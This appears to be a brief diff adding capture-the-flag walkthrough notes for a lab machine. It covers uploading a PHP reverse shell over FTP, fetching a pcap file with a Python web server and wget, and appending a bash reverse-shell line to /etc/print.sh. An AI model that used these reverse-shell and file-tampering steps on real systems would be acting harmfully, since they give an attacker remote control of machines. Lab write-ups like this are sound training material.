@@ -1,0 +1,10 @@
+Starting from the hard part
+after getting into the ftp services, there is a directory called ftp redirect to it and then upload the edited reverse php shell file
+and then listen on the port and redirect to the web page  and click on it then you are one step in the services
+go to the incidents directory to get the file inside it use first this command there   'python3 -m http.server 8080'
+then open another terminal and download the file using this command 'wget 10.10.243.235:8080/suspicious.pcapng'
+
+modify the the print.sh to this
+echo " /bin/bash -i >& /dev/tcp/10.10.182.245/3456 0>&1" >> /etc/print.sh
+
+
